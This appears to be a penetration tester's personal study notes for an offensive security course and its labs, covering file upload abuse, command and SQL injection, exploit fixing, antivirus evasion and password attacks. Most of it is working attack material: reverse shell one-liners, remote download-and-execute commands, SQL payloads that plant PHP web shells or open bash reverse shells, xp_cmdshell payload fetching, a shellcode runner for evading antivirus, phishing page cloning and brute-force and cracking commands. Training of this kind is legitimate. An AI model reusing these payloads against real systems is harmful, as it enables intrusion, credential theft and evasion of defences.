$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

https://www.base64encode.org/

**ALL WAYS USE UTF-16LE With Powershell , Instead Try Both**

```jsx
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0

```

```jsx
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0

```

```jsx
Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like .txt, then changing the file back to the original file type of the web shell by renaming it.
```

# FULLY INTERACTIVE POWERSHELL REVSHELL

```jsx
https://github.com/antonioCoco/ConPtyShell
powershell.exe -Command "IEX (IWR 'http://192.168.45.195/shell.ps1' -UseBasicParsing); Invoke-ConPtyShell 192.168.45.195 3001"
stty raw -echo; (stty size; cat) | nc -lvnp 3001

to run with sigma try searcing for ConPtyShell

```

### **Using Non-Executable Files**

```jsx
n this section, we'll examine why flaws in file uploads can have severe consequences even if there is no way for an attacker to execute the uploaded files. We may encounter scenarios where we find an unrestricted file upload mechanism but cannot exploit it. One example for this is Google Drive, where we can upload any file, but cannot leverage it to get system access. In situations such as this, we need to leverage another vulnerability such as Directory Traversal to abuse the file upload mechanism.
```

```jsx
When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
```

```jsx
Let's try to overwrite the authorized_keys file in the home directory for root. If this file contains the public key of a private key we control, we can access the system via SSH as the root user. To do this, we'll create an SSH keypair with ssh-keygen, as well as a file with the name authorized_keys containing the previously created public key.
```

`ssh-keygen -t rsa -b 4096 -f fileup_rsa`

`cat fileup.pub > authorized_keys`

path will be : **../../../../../../../root/.ssh/authorized_keys**

```jsx
Figure 22 shows the specified relative path for our authorized_keys file. If we've successfully overwritten the authorized_keys file of the root user, we should be able to use our private key to connect to the system via SSH. We should note that often the root user does not carry SSH access permissions. However, since we can't check for other users by, for example, displaying the contents of /etc/passwd, this is our only option.
```

If any error try rm `~/.ssh/known_hosts`

`ssh -p 2222 -i fileup root@mountaindesserts.com`

# **OS Command Injection**

```jsx
The figure shows that the "Archive" parameter contains the Git command. This means we can use curl to provide our own commands to the parameter. We'll do this by using the -X parameter to change the request type to POST. We'll also use --data to specify what data is sent in the POST request.
```

```jsx
The output shows the help page for the git command, confirming that we are not restricted to only using git clone. Since we know that only providing "git" works for execution, we can try to add the version subcommand. If this is executed, we'll establish that we can specify any git command and achieve code execution. This will also reveal if the web application is running on Windows or Linux, since the output of git version includes the "Windows" string in Git for Windows. If the web application is running on Linux, it will only show the version for Git.
```

`git version`

`curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive`

## Code Snippet to check where our code is executed

```jsx
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

URL encoded : `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive`
 

# POWERSHELL ONELINERS

https://www.abatchy.com/2017/03/powershell-download-file-one-liners

## POWERSHELL REVSHELL POWERCAT

```jsx
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 

iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
```

popen(f'echo "$input_here"')

App behavior changes with `;`, `|`, `&&`, `||`, `$(...)`, or backticks

## COMMAND INJECTION CAPSTONE

```jsx
ffa=test
ffa=test;id
ffa=test&&id
ffa=test|id
ffa=testid
ffa=test$(id)
ffa="test";id;#
```

```jsx
✅ You send:

ffa=hello; id

You get:

Status: ffa=hello; id

So the full line is reflected as-is.

But there’s no output of id like:

uid=1000(...)

That tells you:

    The command id did not run

    The full string ffa=hello; id is being printed as one literal string

That only happens if it's passed like:

echo "ffa=hello; id"

Because when the shell sees that:

    The entire thing is quoted → ; is treated as a string character, not a command separator

    So no command execution happens

🔥 Then you try:

ffa="; id; #

And suddenly the output is:

uid=1000(yelnats) gid=1000(yelnats) ...

💡 Why did this work?

It changed the structure to:

echo ""; id; #"

    First quote ends the string

    id is executed

    # comments out the trailing garbage

    echo becomes harmless

    Boom, you get RCE

📌 Summary: Key Observations
Observation	Inference
ffa=hello; id reflected as-is	Input wrapped in quotes
No command runs	Shell didn’t evaluate ;
ffa="; id; # works	Input now breaks out of quotes
You see uid=...	✅ Code executed
🧠 Tip: Always Test for Quoting

When you don’t know how input is wrapped:

    Try sending: a;id → does id run?

    Try: "a";id → does it fail?

    Try: a$(id) or a`id` → any command substitution?

    Try closing with a quote: ";id;#

If command injection fails until you close a quote, you know the server wraps input in quotes.
```

`";echo a`

`";whoami #`

# SQL Injection Attacks

MySql

`mysql -u root -p'root' -h 192.168.50.16 -P 3306`

`select version();`

`select system_user();` 

`show databases;` 

`SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';`

Mongodb nosql

Change the username and password parameters to $ne $regex

![1000054396.jpg](1000054396.jpg)

ssti

MSSql

`impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth` 

USE msdb;
GO
SELECT * FROM sys.tables;

`SELECT @@version;`

```jsx
When using an SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by GO on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.
```

`SELECT name FROM sys.databases;`

`SELECT * FROM offsec.information_schema.tables;`

`select * from offsec.dbo.users;`

`USE master;` 

`SELECT * FROM sysusers;`

POSTGRE SQL

`psql -h 192.168.50.63 -p 2345 -U postgres` 

`\l`

`\c confluence` 

`\dt`

`select * from cwd_user;`

## **Manual SQL Exploitation**

`offsec' OR 1=1 -- //`
`SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --`

`' or 1=1 in (select @@version) -- //` 

```jsx
MySQL accepts both version() and @@version statements.
```

```jsx
The running MySQL version (8.0.28) is included along with the rest of the web application payload. This means we can query the database interactively, like how we would use an administrative terminal.

As it seems we have unbounded control over database queries, let's try to dump all the data inside the users table.

' OR 1=1 in (SELECT * FROM users) -- //

```

`' OR 1=1 in (SELECT * FROM users) -- //` 
`' or 1=1 in (SELECT password FROM users) -- //` 
`' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`

```jsx
'
"
,
; ;
:
=
==
//
///
\

```

## **UNION-based Payloads**

```jsx
Whenever we're dealing with in-band SQL injections and the result of the query is displayed along with the application-returned value, we should also test for UNION-based SQL injections
```

```jsx
The UNION keyword aids exploitation because it enables the execution of an extra SELECT statement and provides the results in the same query, thus concatenating two queries into one statement.
```

```jsx
For UNION SQLi attacks to work, we first need to satisfy two conditions:

    The injected UNION query has to include the same number of columns as the original query.
    The data types need to be compatible between each column.

```

`' ORDER BY 1-- //`
`uid=offsec'+ORDER+BY+6--+//`

`%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //`

above command to check paramerter type string or not
`%' UNION SELECT database(), user(), @@version, null, null -- //`

`' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`  may show error always recheck shell after

FROM EXP :

```jsx
SELECT @@basedir, @@datadir;

SELECT LOAD_FILE('/etc/passwd');

--file-write=shell.php --file-dest="E:/MYSqlInstance/xampp/htdocs/shell.php" --technique=BEU
```

Enumerate :

`' UNION SELECT 1,2,3,SCHEMA_NAME,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -`

`?year=1' UNION SELECT 1,2,3,TABLE_NAME,5,6 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='ctfdb'-- -`

`?year=1' UNION SELECT 1,2,3,COLUMN_NAME,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -`

`' UNION SELECT 1,2,3,CONCAT(id,':',password),5,6 FROM users-- -` 

`' UNION SELECT 1,2,id,password,5,6 FROM users-- -`

The `"<?php system($_GET['cmd']);?>"` is counted as a column

Method-1

`'; COPY (SELECT '<?php system($_GET[''cmd'']); ?>') TO '/var/www/html/tmp/webshell.php'; --`  

Method-2 

`'; CREATE TABLE shell(output text); —`

`'; COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.243/9001 0>&1"'; —`

SOME GARBAGE

```jsx
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5', 'a6' -- //
%' UNION SELECT database(), user(), @@version, null, null, null -- //
%' UNION SELECT null, null, null, null, @@version, null  -- //
database()
%' UNION SELECT null, null, null, null, user(), null  -- //
%' union select null, null, null, null, table_name, null from information_schema.columns where table_schema=database() -- //

animal_planet

%' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

'; COPY (SELECT '<?php system($_GET[''cmd'']); ?>') TO '/var/www/html/tmp/webshell.php'; --

'; COPY (SELECT '<?php system($_GET[''cmd'']); ?>') TO '/var/www/html/tmp/webshell.php'; --

%' UNION SELECT 'a1', null, null, 'a', CREATE TABLE shell(output text), null  -- //

%' CREATE TABLE shell(output text) -- //

'; COPY shell FROM PROGRAM 'curl http://192.168.45.243'; --

'; CREATE TABLE shell(output text); --
CREATE TABLE shell(output text);

'; COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.243/9001 0>&1"'; --

%' UNION SELECT null, null, null, null, null, null  -- //
```

postgresql : https://pentesterlab.com/exercises/from-sqli-to-shell-pg-edition

may show error always recheck shell after

```jsx
After launching our attack, we'll notice that the username and the DB version are present on the last line, but the current database name is not. This happens because column 1 is typically reserved for the ID field consisting of an integer data type, meaning it cannot return the string value we are requesting through the SELECT database() statement.

The web application explicitly omits the output from the first column because IDs are not usually useful information for end users.
```

With this in mind, let's update our query by shifting all the
enumerating functions to the right-most place, avoiding any type
mismatches.

```
' UNION SELECT null, null, database(), user(), @@version  -- //
```

`' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`

```jsx
This output verifies that the three columns contain the table name, the column name, and the current database, respectively.
```

`' UNION SELECT null, username, password, description, null FROM users -- //`

https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/Oracle%20-%20Error%20Union%5CBased%20SQLi

```jsx
query used by the website).

Great, let's find which column is reflecting data. To do that, we have to replace each null by integer surrounded by '. We have to replace each null one by one untill a number is being reflected on the website. For example:

http://domain.com/index.php?id=1' Union Select '1', null, null, null, null, null, null from dual-- - not reflecting
http://domain.com/index.php?id=1' Union Select '1', '2', null, null, null, null, null from dual-- - not reflecting
http://domain.com/index.php?id=1' Union Select '1', '2', '3', null, null, null, null from dual-- - not reflecting
http://domain.com/index.php?id=1' Union Select '1', '2', '3', '4', null, null, null from dual-- - not reflecting
http://domain.com/index.php?id=1' Union Select '1', '2', '3', '4', '5', null, null from dual-- - number 5 is being displayed on the website.
```

## **Blind SQL Injections**

```jsx
Although "boolean-based" might not seem like a blind SQLi variant, the output used to infer results comes from the web application, not the database itself.
```

`http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //`
`http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //`

```jsx
When dealing with blind SQL injections, it is always recommended to probe the application’s behavior for both valid and erroneous responses. In this case, we aim to experiment by sending a fictitious username and verifying the response against a valid one, such as the offsec user.
```

## SQL **Code Execution**

`impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth` 

`EXECUTE sp_configure 'show advanced options', 1;` 

`RECONFIGURE;` 

`EXECUTE sp_configure 'xp_cmdshell', 1;`

`RECONFIGURE;`

```jsx
Although the various MySQL database variants don't offer a single function to escalate to RCE, we can abuse the SELECT INTO_OUTFILE statement to write files on the web server.

For this attack to work, the file location must be writable to the OS user running the database software.
```

`' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //` may show error always recheck shell after

### MSSQL

```jsx
when trying sql injections payloads in burp always press backspace in the end of payload

';EXEC+sp_configure+'show+advance+options',+1%3b--
';RECONFIGURE%3b--
'%3bEXECUTE+sp_configure+'xp_cmdshell',+1%3b+--
'%3bEXEC+xp_cmdshell+"curl+http%3a//192.168.45.228/shell.exe+-o+C%3a\Users\Public\shell.exe"--
'%3bEXEC+xp_cmdshell+"C%3a\Users\Public\shell.exe"--

always check path

```

### MARIADB

```jsx
 proxychains4 mysql -u root -p -h 127.0.0.1 --skip-ssl
  SHOW DATABASES;
  SHOW TABLES;
  SELECT * from creds;
  
```

CAPSTONE :

`GET /?cat='+ORDER+BY+4--+// HTTP/1.1` 

Always check orignal exploit carefully

and always check the reponse html carefully 

```jsx
lass=\"survey-question-text question-validate \" required\/>\n    <\/div>\n  <\/td>\n<\/tr>\n<tr>\n  <td>\n    <div class=\"survey-wrap-input\">\n              <input type=\"text\" name=\"ps_questions[1][description]\" placeholder=\"Insert a description\" value=\"$P$BINTaLa8QLMqeXbQtzT2Qfizm2P\/nI0\" \/>\n          <\/div>\n  <\/td>\n<\/tr>\n    <tr>\n      <td class=\"surgey_repeater_field\">\n        <table id=\"survey_question_answers_1\" class=\"survey_inner_settings\">\n  <tbody class=\"answers_container_box sortable\">\n      <\/tbody>\n  <tfoot>\n    <tr>\n      <td>\n  <a href=\"#\" class=\"button button-large btn-add-answer\" data-question-id=\"1\" data-multiple-answers=\"false\" data-action=\"
```

### DUMP WP CREDS

```jsx
%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users
```

## FLAG FINDER

`find / -type f -name "flag.txt" 2>/dev/null` 

`dir C:\flag.txt /s /b`

`dir C:\Users\flag.txt /s /b`

`Get-ChildItem -Path C:\Users -Filter flag.txt -Recurse -File | Select-Object -ExpandProperty FullName`

## PHISHING

`wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "[https://zoom.us/signin#/login](https://zoom.us/signin#/login)"`

`sudo python -m http.server 80`

![image.png](image%208.png)

![image.png](image%209.png)

# FINDING EXPLOITS

https://www.exploit-db.com/

https://twitter.com/packet_storm

https://github.com/

[OffSec](https://github.com/offensive-security) has
a GitHub account where we can find different repositories like
*exploitdb-bin-sploits*, which contains pre-compiled exploits for easy
execution.

![](https://static.offsec.com/offsec-courses/PEN-200/imgs/using_public_exploits2/abf5bd155d122919e4a794042fdd4456-github03.png)

Also ssearch google for port and service if stuck like 

1978/tcp open  unisql? google search : port 1978 unisql

Always try 3-4 diff exploits

`firefox --search "Microsoft Edge site:exploit-db.com”`

`sudo apt update && sudo apt install exploitdb`

`searchsploit remote smb microsoft windows`

`searchsploit -m 42031`

`nmap --script-help=clamav-exec.nse`

https://python2to3.com/

## METASPLOIT COMMAND

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe`

### WORDLIST

[https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

```jsx
#Edit: I used cewl http://192.168.233.11/ -w custom_wordlist.txt to generate password list and found the right one the
```

```jsx
These target-specific variables explain why online resources like the Exploit Database host multiple exploits for the same vulnerability, each written for different target operating system versions and architectures.
```

# FIXING EXPLOITS

```jsx
Memory corruption vulnerabilities can occur in different parts of a program such as the heap or the stack. The heap is dynamically managed and typically stores large chunks of globally accessible data, while the stack's purpose is to store local functions' data, and its size is generally fixed.
```

![ff41165ebfd6a934a4c89cd7d0d01b93-bof.png](ff41165ebfd6a934a4c89cd7d0d01b93-bof.png)

```jsx
As the letter "A" in hexadecimal converts to "41", the return address would be overwritten with a value of "\x41\x41\x41\x41".
```

```jsx
A typical buffer overflow attack scenario involves overwriting the return address with a JMP ESP instruction, which instructs the program to jump to the stack and execute the shellcode that has been injected right after the beginning of the payload.
```

`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe`

```jsx
Something went wrong during the compilation process and although the errors from Listing 8 may be unfamiliar, a simple Google search for the first error related to "WSAStartup" reveals that this is a function found in winsock.h. Further research indicates that these errors occur when the linker cannot find the winsock library, and that adding the -lws2_32 parameter to the i686-w64-mingw32-gcc command should fix the problem.
```

`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`

```jsx
With the -l option, we can instruct mingw-w64 to search for the ws2_32 DLL and include it in the final executable via static linking.
```

Cannot load kernel 32.dll you should use -lkernel32 option and if another issue use 

rm -rf ~/.wine/ then  dpkg --add-architecture i386 && apt-get update && apt-get install wine32 

also try 

WINEARCH=win32 WINEPREFIX=~/.wine32 winecfg

```jsx
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83

    Listing 11 - Changing the return address

If we do not have a return address from a previously developed exploit, we have a few options to consider. The first, and most recommended option, is to recreate the target environment locally and use a debugger to determine this address.

If this is not an option, we could use information from other publicly available exploits to find a reliable return address that will match our target environment. For example, if we needed a return address for a JMP ESP instruction on Windows Server 2019, we could search for it in public exploits leveraging different vulnerabilities targeting that operating system. This method is less reliable and can vary widely depending on the protections installed on the operating system.
```

```jsx
Now that we have an updated, clean-compiling exploit, we can test it out. We'll return to Immunity Debugger with Sync Breeze attached and press C+g, follow the JMP ESP address at 0x10090c83, and press @ to set a breakpoint on it.
```

# **Fixing Web Exploits**

```jsx

Does it initiate an HTTP or HTTPS connection?
Does it access a specific web application path or route?
Does the exploit leverage a pre-authentication vulnerability?
If not, how does the exploit authenticate to the web application?
How are GET or POST requests crafted to trigger and exploit the vulnerability? Is there any HTTP method involved?
Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
Will oddities such as self-signed certificates disrupt the exploit?

```

```jsx
 response  = requests.post(url, data=data, allow_redirects=False, verify=False)
...
```

```jsx
 print "[+] String that is being split: " + location
```

# RDP COPY

```jsx
xfreerdp /u:USERNAME /p:PASSWORD /v:IP /drive:share,/path/to/local/folder

xfreerdp /v:192.168.183.211 /u:gunther /p:password123! +clipboard /cert:ignore

/u:"CORP\\Administrator"

xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 

xfreerdp /u:damian  /p:'ICannotThinkOfAPassword1!' /v:192.168.177.221 /drive:share,/home/kali/pimpmykali/ +clipboard /dynamic-resolution

proxychains4 xfreerdp3  /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:172.16.189.15 /u:andrea /p:"PasswordPassword_6" /d:relia.com
```

# **Antivirus Evasion**

[https://yan1x0s.medium.com/hack-your-oscp-certification-ba29317c72ff](https://yan1x0s.medium.com/hack-your-oscp-certification-ba29317c72ff)

```jsx
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc`

change variable names

`nc -lvnp 443`

```jsx
kali@kali:~$ apt-cache search shellter
shellter - Dynamic shellcode injection tool and dynamic PE infector

kali@kali:~$ sudo apt install shellter
...

    Listing 18 - Installing shellter in Kali Linux

Since Shellter is designed to be run on Windows operating systems, we will also install wine, a compatibility layer capable of running win32 applications on several POSIX-compliant operating systems.

kali@kali:~$ sudo apt install wine
...

kali@kali:~$ sudo dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32

```

# **Password Attacks**

## **SSH and RDP**

```jsx
 if a user hasn't changed their password since a recent password policy change, their password may be weaker than the current policy. This might make it more vulnerable to password attacks.
 Get-NetUser | select cn,pwdlastset,lastlogon
```

```jsx
It's worth noting that the format of the username also suggests that the company may use the first name of the user for account names. This information may assist us in later information gathering attempts
```

`cd /usr/share/wordlists/`

`sudo gzip -d rockyou.txt.gz` 

`hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201` 

`crunch 6 6 -t Lab%%% > wordlist`  % = numeric

`hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V`

`sudo -l`

```jsx
Since there are many different ways to gain access to passwords, this is an extremely viable technique. For example, we may gain access to credentials using one of the techniques discussed later in this Module, or we may find them stored as plaintext in a file or through the use of an online password leak database. These services (such as ScatteredSecrets) track password leaks and compromises and sell the plaintext passwords. This can be very beneficial during a penetration test, but we must make sure we do not violate the terms of these services, we must ensure that we only use the passwords in direct cooperation with the legal owner, and we must review the service carefully to determine if it's operating legally. For example, WeLeakInfo was recently seized by the FBI and U.S. Department of Justice for alleged illegal activity.
```

**`/usr/share/wordlists/dirb/others/names.txt`**

`echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt`

`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`

# **HTTP POST Login Form**

```jsx
After reading the application's documentation, we discover that TinyFileManager includes two default users: admin and user. After trying and failing to log in with the application's default credentials, we'll attack the user account with passwords from the rockyou.txt wordlist.
```

```jsx
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid”
```

HTTP BASIC AUTH 

```jsx
hydra -L usernames.txt -P combined_passwords.txt localhost -s 8000 http-get /
```

# **Password Cracking Fundamentals**

*Symmetric encryption* algorithms use the same key for both encryption and decryption.

The *Advanced Encryption Standard (*AES) is an example of a symmetric encryption algorithm.
(RSA) is a common asymmetric encryption algorithm.

Extremely rare *hash collision* in which two input values result in the same hash value.

```jsx
Hashcat and John the Ripper (JtR) are two of the most popular password cracking tools that automate this process. In general, JtR is more of a CPU-based cracking tool, which also supports GPUs, while Hashcat is mainly a GPU-based cracking tool that also supports CPUs. JtR can be run without any additional drivers using only CPUs for password cracking. Hashcat requires OpenCL or CUDA for the GPU cracking process. For most algorithms, a GPU is much faster than a CPU since modern GPUs contain thousands of cores, each of which can share part of the workload. However, some slow hashing algorithms (like bcrypt) work better on CPUs.
```

```jsx
Hashcat and John the Ripper (JtR) are two of the most popular password cracking tools that automate this process. In general, JtR is more of a CPU-based cracking tool, which also supports GPUs, while Hashcat is mainly a GPU-based cracking tool that also supports CPUs. JtR can be run without any additional drivers using only CPUs for password cracking. Hashcat requires OpenCL or CUDA for the GPU cracking process. For most algorithms, a GPU is much faster than a CPU since modern GPUs contain thousands of cores, each of which can share part of the workload. However, some slow hashing algorithms (like bcrypt) work better on CPUs.
```

![image.png](image%2010.png)

```jsx
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
python3 -c "print(62**5)"
```

```jsx
hashcat -b
```

![image.png](image%2011.png)

`python3 -c "print(916132832 / 134200000)”`

`python3 -c "print(916132832 / 9276300000)`

![image.png](image%2012.png)

## **Mutating Wordlists ( Rules )**

`hashcat --help | grep -i "KeePass”`

```jsx
Most passwords in the commonly-used wordlists will not fulfill these requirements. If we wanted to use these lists against a target with strong password policies, we would need to manually prepare the wordlist by removing all passwords that do not satisfy the password policy or by manually modifying the wordlist to include appropriate passwords. We can address this by automating the process of changing (or mutating) our wordlist before sending them to this target in what is known as a rule-based attack. In this type of attack, individual rules are implemented through rule functions, which are used to modify existing passwords contained in a wordlist. An individual rule consists of one or more rule functions. We will often use multiple rule functions in each rule.
```

![image.png](image%2013.png)

```jsx
mkdir passwordattacks
cd passwordattacks
head /usr/share/wordlists/rockyou.txt > demo.txt
sed -i '/^1/d' demo.txt 
cat demo.txt
```

https://hashcat.net/wiki/doku.php?id=rule_based_attack

```jsx
The Hashcat Wiki provides a list of all possible rule functions with examples. If we want to add a character, the simplest form is to prepend or append it. We can use the **$ function to append** a character **or ^ to prepend** a character. Both of these functions expect one character after the function selector. For example, if we want to prepend a "3" to every password in a file, the corresponding rule function would be ^3.

Since many users simply append a "1" to a password that requires a numerical value, let's create a rule file containing $1 to append a "1" to all passwords in our wordlist. We'll create a demo.rule with this rule function. We need to escape the special character "$" to echo it into the file correctly.
```

`echo \$1 > demo.rule`

`hashcat -r demo.rule --stdout demo.txt`

chatgpt rule used in lab :

```jsx
🔧 Step 1: Create the Hashcat Rule File

Create a rule file named append.rule with the following content:

# Append nothing
:

# Append "1"
$1

# Append "!"
$!

Explanation:

    : → do nothing (identity rule)

    $1 → append character 1

    $! → append character !

📁 Step 2: Save the Rule File

Save the above lines into a file named append.rule:

echo -e ':\n$1\n$!' > append.rule

```

![image.png](image%2014.png)

`hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`

`hashcat --help | grep -i "KeePass”`

Some existing rules in hashcat : ls -la /usr/share/hashcat/rules/

`echo '$1@$3$5' > append.rule`  this will not work 

use this : 

$1 $@ $3 $$ $5

`echo '$1 $@ $3 $$ $5' > demo.rule`

![image.png](image%2015.png)

## **Cracking Methodology**

```jsx
Once we obtain hashes, we'll need to determine the hashing algorithm used to create the hash. We can identify the hash type with hash-identifier or hashid, which are both installed on Kali. Depending on the hashing algorithm and the source of the hash, we may need to check if it is already in the correct format for our cracking tool. If not, we'll need to use helper tools to change the representation of the hash into the expected format.
```

https://www.kali.org/tools/hash-identifier/

https://www.kali.org/tools/hashid/

https://hashes.com/en/tools/hash_identifier

hashid ‘hash’

(**rockyou-30000.rule**),

## **Password Manager**

```jsx
In this section we'll demonstrate a very common penetration test scenario. We'll assume we have gained access to a client workstation running a password manager. In the following demonstration, we'll extract the password manager's database, transform the file into a format compatible with Hashcat, and crack the master database password.
```

```jsx
The JtR suite includes various transformation scripts like ssh2john and _keepass2john_, which can format a broad range of different file formats, and they are installed by default on our Kali machine. We can also use these scripts to format hashes for Hashcat.

Let's use the keepass2john script to format the database file and save the output to keepass.hash.
```

![image.png](image%2016.png)

`keepass2john Database.kdbx > keepass.hash` 

 `nano keepass.hash` and remove Database string

`hashcat --help | grep -i "KeePass”`

```jsx
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

# FIND FILES

Powershell One-Liner 

`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

## **SSH Private Key Passphrase**

```jsx
Even though SSH private keys should be kept confidential, there are many scenarios in which these files could be compromised. For example, if we gain access to a web application via a vulnerability like Directory Traversal, we could read files on the system. We could use this to retrieve a user's SSH private key. However, when we try to use it to connect to the system, we would be prompted for a passphrase. To gain access, we'll need to crack the passphrase.
```

`cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65//home/alfred/.ssh/id_rsa`

`chmod 600 id_rsa`

`ssh -i id_rsa -p 2222 [dave@192.168.50.201](mailto:dave@192.168.50.201)`

`ssh2john id_rsa > ssh.hash`

![image.png](image%2017.png)

`cat ssh.hash` 

`nano ssh.hash`

`hashcat -h | grep -i "ssh”` 

```jsx
kali@kali:~/passwordattacks$ cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

`hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force`

**ERROR : IMPORTANT**

![image.png](image%2018.png)

```jsx
kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```

`nano ssh.passwords`

`john --wordlist=ssh.passwords --rules=sshRules ssh.hash`

SSH PUBLIC KEY ERROR :

```jsx
 ssh -i anita.ssh anita@192.168.118.245 -p 2222
```

## **Working with Password Hashes**

```jsx
In real-life penetration tests we will often gain privileged access to a system and can leverage those privileges to extract password hashes from the operating system. We can also create and intercept Windows network authentication requests and use them in further attacks like pass-the-hash or in relay attacks.

